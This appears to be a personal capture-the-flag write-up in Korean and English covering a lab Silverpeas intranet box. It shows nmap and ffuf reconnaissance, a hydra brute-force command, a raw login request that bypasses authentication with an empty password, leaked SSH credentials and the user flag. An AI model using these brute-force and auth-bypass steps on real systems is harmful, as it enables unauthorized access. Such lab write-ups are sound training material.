10.10.96.166

# 단서 발견

<p>If you'd like to get in touch with us, please reach out to our project manager on Silverpeas. His username is "scr1ptkiddy".</p>

1. Silverpeas
2. scr1ptkiddy

# nmap

nmap -Pn -sV -T4 -sC --open -oN nmap.txt 10.10.96.166

```
# Nmap 7.95 scan initiated Tue Jul 15 14:20:08 2025 as: /usr/lib/nmap/nmap -Pn -sV -T4 -sC --open -oN namp.txt 10.10.96.166
Nmap scan report for 10.10.96.166
Host is up (0.30s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 1b:1c:87:8a:fe:34:16:c9:f7:82:37:2b:10:8f:8b:f1 (ECDSA)
|_  256 26:6d:17:ed:83:9e:4f:2d:f6:cd:53:17:c8:80:3d:09 (ED25519)
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Hack Smarter Security
8080/tcp open  http-proxy
|_http-title: Error
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Tue, 15 Jul 2025 14:20:23 GMT
|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|     Connection: close
|   GetRequest:
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Tue, 15 Jul 2025 14:20:21 GMT
|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|   HTTPOptions:
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Tue, 15 Jul 2025 14:20:22 GMT
|_    <html><head><title>Error</title></head><body>404 - Not Found</body></html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.95%I=7%D=7/15%Time=687663A6%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,C9,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20close\r
SF:\nContent-Length:\x2074\r\nContent-Type:\x20text/html\r\nDate:\x20Tue,\
SF:x2015\x20Jul\x202025\x2014:20:21\x20GMT\r\n\r\n<html><head><title>Error
SF:</title></head><body>404\x20-\x20Not\x20Found</body></html>")%r(HTTPOpt
SF:ions,C9,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20close\r\nCo
SF:ntent-Length:\x2074\r\nContent-Type:\x20text/html\r\nDate:\x20Tue,\x201
SF:5\x20Jul\x202025\x2014:20:22\x20GMT\r\n\r\n<html><head><title>Error</ti
SF:tle></head><body>404\x20-\x20Not\x20Found</body></html>")%r(RTSPRequest
SF:,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConn
SF:ection:\x20close\r\n\r\n")%r(FourOhFourRequest,C9,"HTTP/1\.1\x20404\x20
SF:Not\x20Found\r\nConnection:\x20close\r\nContent-Length:\x2074\r\nConten
SF:t-Type:\x20text/html\r\nDate:\x20Tue,\x2015\x20Jul\x202025\x2014:20:23\
SF:x20GMT\r\n\r\n<html><head><title>Error</title></head><body>404\x20-\x20
SF:Not\x20Found</body></html>")%r(Socks5,42,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(Gener
SF:icLines,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\
SF:r\nConnection:\x20close\r\n\r\n")%r(Help,42,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(SS
SF:LSessionReq,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x
SF:200\r\nConnection:\x20close\r\n\r\n")%r(TerminalServerCookie,42,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20
SF:close\r\n\r\n")%r(TLSSessionReq,42,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(Kerberos,42
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnect
SF:ion:\x20close\r\n\r\n")%r(SMBProgNeg,42,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(LPDStr
SF:ing,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nC
SF:onnection:\x20close\r\n\r\n")%r(LDAPSearchReq,42,"HTTP/1\.1\x20400\x20B
SF:ad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 15 14:21:59 2025 -- 1 IP address (1 host up) scanned in 110.81 seconds
```

# 취약점 의심 -> 딱히 유용한 취약점은 아님

- https://www.cve.org/CVERecord?id=CVE-2021-36368
- https://www.cve.org/CVERecord?id=CVE-2023-28531

# ffuf 1차 경로 시도 : torsocks ffuf -u http://10.10.96.166/FUZZ -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt

# tor 를 사용하므로 스레드 5~10 정도

# ffuf, gobuster, amass ❌ 작동 안 함 Go 기반 / glibc 미사용

torsocks ffuf -u http://10.10.96.166/FUZZ -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -o ffuf1.txt -t 20

└─# torsocks ffuf -u http://10.10.96.166/FUZZ -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : GET
:: URL : http://10.10.96.166/FUZZ
:: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500

---

assets [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 271ms]
images [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 271ms]
:: Progress: [151265/151265] :: Job [1/1] :: 115 req/sec :: Duration: [0:20:09] :: Errors: 0 ::

# 1차 결과

- assets
- images

# 2차 서브 도메인 시도~ 여러 파일 실행해보기 : ffuf -u http://10.10.96.166 -H "Host:FUZZ.10.10.96.166" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o ffuf2.txt -t 100 -fs 14124

┌──(root㉿docker-desktop)-[/]
└─# ffuf -u http://10.10.96.166 -H "Host:FUZZ.10.10.96.166" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o ffuf2.txt -t 100 -fs 14124

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : GET
:: URL : http://10.10.96.166
:: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
:: Header : Host: FUZZ.10.10.96.166
:: Output file : ffuf2.txt
:: File format : json
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 100
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500
:: Filter : Response size: 14124

---

:: Progress: [114442/114442] :: Job [1/1] :: 359 req/sec :: Duration: [0:06:28] :: Errors: 0 ::

# 80 말고 unknown 8080 도 시도

# ffuf -u http://10.10.96.166:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

──(root㉿docker-desktop)-[/]
└─# ffuf -u http://10.10.96.166:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : GET
:: URL : http://10.10.96.166:8080/FUZZ
:: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500

---

website [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 298ms]
console [Status: 302, Size: 0, Words: 1, Lines: 1, Duration:

- website, console 발견

# 접근 8080

┌──(root㉿docker-desktop)-[/]
└─# http http://10.10.96.166:8080/website/
HTTP/1.1 403 Forbidden
Connection: keep-alive
Content-Length: 68
Content-Type: text/html;charset=UTF-8
Date: Wed, 16 Jul 2025 14:36:41 GMT

<html><head><title>Error</title></head><body>Forbidden</body></html>

┌──(root㉿docker-desktop)-[/]
└─# http http://10.10.96.166:8080/console/
HTTP/1.1 302 Found
Connection: keep-alive
Content-Length: 0
Date: Wed, 16 Jul 2025 14:36:50 GMT
Location: /noredirect.html

# /console 접근 시 -> noredirect.html 로 리다이렉트

# noredirect.html 새로운 경로 발견 -> 시도 -> 아무것도 없음 404

──(root㉿docker-desktop)-[/]
└─# http http://10.10.96.166:8080/noredirect.html
HTTP/1.1 404 Not Found
Connection: keep-alive
Content-Length: 74
Content-Type: text/html
Date: Wed, 16 Jul 2025 14:38:56 GMT

<html><head><title>Error</title></head><body>404 - Not Found</body></html>

# 다 안 됨 -> 공격 표면이 상당히 찾기 어려움 -> 다시 처음으로 돌아가서 단서 활용하기 -> 80 또는 8080 뒤에 경로로 넣어보기

1. Silverpeas
2. scr1ptkiddy

# 힌트 기반으로 시도 -> 새로운 페이지 열림 -> 인트라넷이라고 나옴

http://10.10.156.119:8080/silverpeas/defaultLogin.jsp

- 로그인 테스트
  http://10.10.156.119:8080/silverpeas/defaultLogin.jsp?DomainId=0&ErrorCode=1

# hydra 로그인 프루브 포싱

hydra -l scr1ptkiddy -P passwords.txt 10.10.156.119 http-post-form \
"/silverpeas/jsp/login.jsp:username=^USER^&password=^PASS^&DomainId=0:Location"

# Google CEV 발견 -> scr1ptkiddy 로그인 시 password 없이 로그인 가능

# 버프 스위트

![](https://velog.velcdn.com/images/agnusdei1207/post/9283f92b-10a8-4cf3-958a-c34c16a86502/image.png)

POST /silverpeas/AuthenticationServlet HTTP/1.1
Host: 10.10.156.119:8080
Content-Length: 38
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.156.119:8080
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10*15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/\_;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.156.119:8080/silverpeas/defaultLogin.jsp
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=ynxIq7QIzMeWyFR1tQ1FZCq9e9DT0Ks1TlnSIJn2.ebabc79c6d2a
Connection: keep-alive

Login=scr1ptkiddy&Password=&DomainId=0

# scr1ptkiddy 인증 됨

GET /silverpeas/Main//look/jsp/MainFrame.jsp HTTP/1.1
Host: 10.10.156.119:8080
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10*15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/\_;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.156.119:8080/silverpeas/defaultLogin.jsp?DomainId=0&ErrorCode=2
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=ynxIq7QIzMeWyFR1tQ1FZCq9e9DT0Ks1TlnSIJn2.ebabc79c6d2a; defaultDomain=0; svpLogin=scr1ptkiddy
Connection: keep-alive

# 접근 가능

![](https://velog.velcdn.com/images/agnusdei1207/post/f8600306-85aa-419e-b879-576bf18e81c8/image.png)

http://10.10.156.119:8080/silverpeas/look/jsp/MainFrame.jsp

# silveradmin@localhost

# Administrateur

# Manager

![](https://velog.velcdn.com/images/agnusdei1207/post/df68857c-befb-40b7-9ca7-48150afa7efa/image.png)
![](https://velog.velcdn.com/images/agnusdei1207/post/78890476-6e63-4485-a074-0068132e8305/image.png)

# notification ID5 확인

![](https://velog.velcdn.com/images/agnusdei1207/post/f0a7859b-e9f1-4d50-bb4c-8a3a3febbcd6/image.png)

# Manager 인증 됨 -> 알림 확인 -> SSH 정보 노출

![](https://velog.velcdn.com/images/agnusdei1207/post/fb70746a-1bbd-417c-a1e4-68560a724423/image.png)

Dude how do you always forget the SSH password? Use a password manager and quit using your silly sticky notes.

Username: tim

Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol

# ssh tim@10.10.156.119 -> SSH 접속 성공

tim@silver-platter:~$ ls
user.txt
tim@silver-platter:~$ cat user.txt
THM{c4ca4238a0b923820dcc509a6f75849b}
tim@silver-platter:~$
